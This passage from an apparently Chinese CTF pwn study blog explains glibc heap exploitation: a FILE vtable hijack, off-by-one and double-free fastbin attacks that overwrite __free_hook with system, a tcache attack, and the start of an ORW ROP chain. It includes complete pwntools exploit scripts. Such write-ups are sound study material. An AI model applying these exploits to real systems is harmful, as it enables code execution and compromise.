<span class="token comment" spellcheck="true">// write</span>   <span class="token number">17</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// seek</span>   <span class="token number">18</span> pwn<span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">// close</span>   <span class="token number">19</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// stat</span>   <span class="token number">20</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// showmanyc</span>   <span class="token number">21</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// imbue</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><pre class=" language-python"><code class="language-python">rc<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>rc<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3c5600</span>onegadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xf1147</span><span class="token keyword">print</span> <span class="token string">"libc_base--->"</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span>system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>fake_vtable <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x3c5600</span><span class="token operator">-</span><span class="token number">8</span> binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>py <span class="token operator">=</span> <span class="token string">'\x00'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span><span class="token number">0x3c55e0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_vtable<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span>edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>py<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># trigger abort-->flush</span>malloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span></code></pre><p>看一看edit后的效果<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/29.jpg" alt=""><br>这样看不太清楚，我们以8字节对齐来看<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/30.jpg" alt=""><br>再看一下stderr的vtable的指针<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/31.jpg" alt=""><br>确实被修改了(这种攻击方式只对libc2.24以下有效，2.24及以上就有了防御手段了，不过一样有方法攻击)<br>one_gadget的地址被放在了vtable+0x18的位置处，只需要使其报错即可getshell</p><h2 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h2><p>考察点：off-by-one free_hook<br>程序保护全开，有增删查三个功能<br>main函数中有一个sub_BD8函数</p><pre class=" language-c"><code class="language-c">v0 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>qword_202040 <span class="token operator">=</span> _malloc_hook<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v0<span class="token punctuation">;</span></code></pre><p>将__malloc_hook赋给了qword_202040<br>还有一个sub_AFA函数</p><pre class=" language-c"><code class="language-c">v1 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>dword_202048 <span class="token punctuation">)</span>  <span class="token function">_assert_fail</span><span class="token punctuation">(</span><span class="token string">"replaced"</span><span class="token punctuation">,</span> <span class="token string">"fastbin.c"</span><span class="token punctuation">,</span> <span class="token number">0x26u</span><span class="token punctuation">,</span> <span class="token string">"restore_hook"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>dword_202048 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>_malloc_hook <span class="token operator">=</span> qword_202040<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v1<span class="token punctuation">;</span></code></pre><p>就是说malloc_hook的值在每次add之后都会被修改，这样我们就无法利用__malloc_hook了</p><p>再看到add函数<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/32.jpg" alt=""><br>存在off-by-one漏洞</p><p>然后是delete函数<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/33.jpg" alt=""><br>free且清零，无漏洞</p><p>最后是show函数<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/34.jpg" alt=""><br>输出所有chunk的内容</p><p>整理一下攻击思路：无法修改got表，无法利用malloc_hook，剩下的可以利用和free_hook和IO_FILE，个人倾向于使用free_hook<del>(IO_FILE使用不熟练,tcl)</del><br>那么先来泄露libc地址<br>这题的泄露方法很简单，add一个unsorted bin大小的chunk，然后free，接着add相同大小的chunk，接着输出即可</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 1</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>leak_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">'leak_addr:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> leak_addr<span class="token number">-0x3c4b78</span>success<span class="token punctuation">(</span><span class="token string">'libc_base:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>__malloc_hook_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">'__malloc_hook_addr:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>__malloc_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>__free_hook_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">'__free_hook_addr:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>__free_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">'system_addr:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>另外，off-by-one可以构造出doublefree，构造方法如下</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 2</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 3</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 4</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0xe1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># delete 2 and 3</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 2</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 5</span>delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># free chunk3</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># double free chunk3</span></code></pre><p><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/35.jpg" alt=""><br>构造出了double free<br>接下来就是想办法把chunk分配到free_hook上方，然后将system函数的地址写入其中，最后free一个内容是/bin/sh的chunk即可getshell<br>由于free_hook的上方都是0，所以我们无法利用fastbinattack<br>于是我们把topchunk的地址挪一挪，使其挪到一个我们经过一定次数分配后能将chunk分配到free_hook的地方<br>首先让我们康康<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/37.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/38.jpg" alt=""><br>topchunk的地址正是存在main_arena+88处，所以我们想办法修改main_arena+88的值即可，那我们该如何修改修改<br>可以在main_arena附近使用fastbin attack<br>我们可以找到在__malloc_hook-0x3处存在一个大小合适的chunk<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/36.jpg" alt=""><br>而malloc_hook又是紧邻main_arena的，所以可以从这里开始<br>我们先利用double free将chunk分配到malloc_hook-0x3处</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>__malloc_hook_addr<span class="token number">-0x3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># heap 3</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># heap 4</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'cccc'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># heap 5</span></code></pre><p>接下来还要想办法更靠近一点，那就继续fastbin attack，我们只需要伪造fakechunk即可</p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> chr<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x1b</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__malloc_hook_addr<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>康康这样构造之后会变成什么样<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/39.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/40.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/41.jpg" alt=""><br>main_arena+48对应着的是fastbin中0x70大小的chunk的地址，这样我们再add一个就能将chunk分配到main_arena+16处<br>然后就是将topchunk的地址给覆盖掉，覆盖到哪，__free_hook-0xb58处是一个可以接受的地址，作为topchunk大小也足够<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/42.jpg" alt=""></p><pre class=" language-python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> chr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__free_hook_addr<span class="token number">-0xb58</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/43.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/44.jpg" alt=""><br>覆盖成功<br>最后就是连续分配了，考虑到0xb85/0xa0=18…0x18,我们连续分配18个0x90大小的chunk，第十九次分配就能分配到free_hook附近，然后就能修改free_hook的值</p><pre class=" language-python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span></code></pre><p>以下是完整exp</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./heap'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'heap'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.23_x64.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Choice :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'size: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'data: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Choice :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'delete: '</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Choice :'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 1</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>leak_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">'leak_addr:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> leak_addr<span class="token number">-0x3c4b78</span>success<span class="token punctuation">(</span><span class="token string">'libc_base:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>__malloc_hook_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">'__malloc_hook_addr:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>__malloc_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>__free_hook_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">'__free_hook_addr:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>__free_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">'system_addr:'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 2</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 3</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 4</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0xe1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># delete 2 and 3</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 2</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 5</span>delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># free chunk3</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># double free chunk3</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>__malloc_hook_addr<span class="token number">-0x3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># heap 3</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># heap 4</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'cccc'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># heap 5</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> chr<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x1b</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__malloc_hook_addr<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> chr<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x38</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>__free_hook_addr<span class="token number">-0xb58</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="V-amp-N2020-公开赛-easyTHeap"><a href="#V-amp-N2020-公开赛-easyTHeap" class="headerlink" title="[V&amp;N2020 公开赛]easyTHeap"></a>[V&amp;N2020 公开赛]easyTHeap</h2><p>考察点:tcache表头攻击<br>简略说一下吧，tcache结构体存在于heap区域，tcache到tcache+0x50处是各个tcache的大小，剩下的区域中存储着各个tcache的地址，<br>程序存在dobule free，那么我们就可以通过double free泄露heap地址，进而知道tcache地址，然后修改响应大小的tcache指向的地址，就可以任意地址写了<br>之后的攻击就是正常的利用one_gadget分配到malloc_hook上，即可getshell</p><h2 id="V-amp-N2020-公开赛-warmup"><a href="#V-amp-N2020-公开赛-warmup" class="headerlink" title="[V&amp;N2020 公开赛]warmup"></a>[V&amp;N2020 公开赛]warmup</h2><p>考察点：orw攻击和对栈空间的理解<br>同样简略说一下，程序开启了沙箱，禁用了exceve和system，这样我们就无法getshell，只能通过orw攻击读取flag<br>而这个程序的main函数又是个套娃<br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/45.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/46.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/47.jpg" alt=""><br>第一次输入无溢出，第二次输入存在0x10字节的溢出，刚好溢出到rip，而这个函数的栈帧是位于前一个函数上方的，我们只需在rip处<br>用ret语句连接两个栈帧即可执行第一次读入的内容，我们的攻击思路就是，在第一次输入中输入orw的rop链(由于程序开启了PIE，所以我们使用libc中的gadget)，第二次直接溢出到rip，使用ret连接两个栈桢即可</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true"># io = process('./vn_pwn_warmup')</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">25013</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.23_x64.so'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> puts_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'puts_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x21102</span>pop_rsi_ret <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x202e8</span>pop_rdx_ret <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x01b92</span>ret <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x937</span>read_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>write_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token 